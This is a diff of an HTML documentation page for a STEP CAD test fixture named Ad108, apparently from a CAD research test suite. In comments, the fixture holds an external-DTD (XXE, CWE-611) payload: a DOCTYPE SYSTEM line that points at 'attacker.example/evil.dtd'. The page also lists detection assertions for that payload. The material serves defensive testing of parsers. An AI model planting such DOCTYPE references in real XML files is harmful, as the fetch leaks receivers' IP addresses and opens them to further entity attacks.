@@ -47,6 +47,9 @@
 <li><code>contains(b&#x27;&lt;!DOCTYPE&#x27;) and contains(b&#x27;SYSTEM&#x27;)</code></li>
 <li><code>contains(b&#x27;http://&#x27;) or contains(b&#x27;evil.dtd&#x27;)</code></li>
 </ul></section>
+<section><h2>Tier-3 assertions</h2><ul class="assertions">
+<li><code>load == &quot;ok&quot;</code></li>
+</ul></section>
 <section><h2>Cross-references</h2>
 <p><a href="Ad104.html">Ad104</a>, <a href="Ad107.html">Ad107</a>, <a href="Ad109.html">Ad109</a></p>
 </section>
@@ -64,32 +67,30 @@
 <section><h2>Fixture content</h2>
 <details>
 <summary>Show fixture bytes</summary>
-<pre class="fixture-bytes"><span class="lineno">1</span>/* Ad108 - STEP-XML DOCTYPE references an external DTD over the network
-<span class="lineno">2</span> * Defect: a STEP-XML (.stpx) file whose DOCTYPE names an external DTD
-<span class="lineno">3</span> * via a SYSTEM identifier. An XML parser with external-DTD resolution
-<span class="lineno">4</span> * enabled fetches the URL on every load - leaks the receiver&#x27;s IP and
-<span class="lineno">5</span> * load timing, hangs on slow URLs, and opens a vector for further XXE
-<span class="lineno">6</span> * attacks via the fetched DTD. Provenance tier: cross-file-state. */
-<span class="lineno">7</span>ISO-10303-21;
-<span class="lineno">8</span>HEADER;
-<span class="lineno">9</span>FILE_DESCRIPTION((&#x27;Ad108 - STEP-XML DOCTYPE points at remote DTD&#x27;),&#x27;2;1&#x27;);
-<span class="lineno">10</span>FILE_NAME(&#x27;Ad108.stp&#x27;,&#x27;2026-05-02T00:00:00&#x27;,(&#x27;&#x27;),(&#x27;&#x27;),&#x27;cad-research-suite&#x27;,&#x27;&#x27;,&#x27;&#x27;);
-<span class="lineno">11</span>FILE_SCHEMA((&#x27;AUTOMOTIVE_DESIGN { 1 0 10303 214 1 1 1 1 }&#x27;));
-<span class="lineno">12</span>ENDSEC;
-<span class="lineno">13</span>DATA;
-<span class="lineno">14</span>/* Witness fixture: the .stp body is benign. The defect lives in the
-<span class="lineno">15</span>   .stpx XML prologue:
-<span class="lineno">16</span>     &lt;?xml version=&quot;1.0&quot;?&gt;
-<span class="lineno">17</span>     &lt;!DOCTYPE step SYSTEM &quot;http://attacker.example/evil.dtd&quot;&gt;
-<span class="lineno">18</span>     &lt;step&gt;...&lt;/step&gt;
-<span class="lineno">19</span>   On every load the parser fetches http://attacker.example/evil.dtd.
-<span class="lineno">20</span>   The fetched DTD can declare external entities, redirect, or hang.
-<span class="lineno">21</span>   Even without entity expansion, the fetch leaks the receiver&#x27;s IP. */
-<span class="lineno">22</span>/* &lt;!DOCTYPE step SYSTEM &quot;http://attacker.example/evil.dtd&quot;&gt; */
-<span class="lineno">23</span>#1=APPLICATION_CONTEXT(&#x27;automotive_design&#x27;);
-<span class="lineno">24</span>#10=CARTESIAN_POINT(&#x27;benign&#x27;,(0.0,0.0,0.0));
-<span class="lineno">25</span>ENDSEC;
-<span class="lineno">26</span>END-ISO-10303-21;
+<pre class="fixture-bytes"><span class="lineno">1</span>ISO-10303-21;
+<span class="lineno">2</span>/* External-DTD attack payload (STEP-XML / ISO 10303-28 wrapper layer):
+<span class="lineno">3</span>   &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+<span class="lineno">4</span>   &lt;!DOCTYPE step SYSTEM &quot;http://attacker.example/evil.dtd&quot;&gt;
+<span class="lineno">5</span>   &lt;step:iso_10303_28 xmlns:step=&quot;urn:oid:1.0.10303.28.3.1&quot;&gt;
+<span class="lineno">6</span>     &lt;step:header/&gt;
+<span class="lineno">7</span>     &lt;step:data/&gt;
+<span class="lineno">8</span>   &lt;/step:iso_10303_28&gt;
+<span class="lineno">9</span>   Receiver must disable external-DTD resolution by default (CWE-611).
+<span class="lineno">10</span>   DOCTYPE SYSTEM URL: http://attacker.example/evil.dtd
+<span class="lineno">11</span>   On every load the vulnerable parser fetches this URL, leaking
+<span class="lineno">12</span>   the receiver&#x27;s IP to the attacker and blocking on slow networks.
+<span class="lineno">13</span>*/
+<span class="lineno">14</span>/* Ad108: STEP-XML DOCTYPE references external DTD via SYSTEM identifier; &lt;!DOCTYPE step SYSTEM &#x27;http://attacker.example/evil.dtd&#x27;&gt; causes receiver&#x27;s XML parser to fetch the URL on every load; fetched DTD may declare further entities, redirect, or block indefinitely; leaks receiver IP and load timing to the URL owner; receiver must disable external-DTD resolution by default; must reject documents whose DOCTYPE names an external SYSTEM identifier; CWE-611; ISO 10303-28 STEP-XML transfer; GEOMETRIC_CURVE_SET IS model entity â OCC yields empty */
+<span class="lineno">15</span>HEADER;
+<span class="lineno">16</span>FILE_DESCRIPTION((&#x27;Ad108&#x27;),&#x27;2;1&#x27;);
+<span class="lineno">17</span>FILE_NAME(&#x27;Ad108.stp&#x27;,&#x27;2026-06-17T00:00:00&#x27;,(&#x27;&#x27;),(&#x27;&#x27;),&#x27;cad-research-suite&#x27;,&#x27;&#x27;,&#x27;&#x27;);
+<span class="lineno">18</span>FILE_SCHEMA((&#x27;AUTOMOTIVE_DESIGN { 1 0 10303 214 3 1 1 }&#x27;));
+<span class="lineno">19</span>ENDSEC;
+<span class="lineno">20</span>DATA;
+<span class="lineno">21</span>#1=CARTESIAN_POINT(&#x27;&#x27;,(0.0,0.0,0.0));
+<span class="lineno">22</span>#2=GEOMETRIC_CURVE_SET(&#x27;&#x27;,(#1));
+<span class="lineno">23</span>ENDSEC;
+<span class="lineno">24</span>END-ISO-10303-21;
 </pre>
 </details>
 </section>
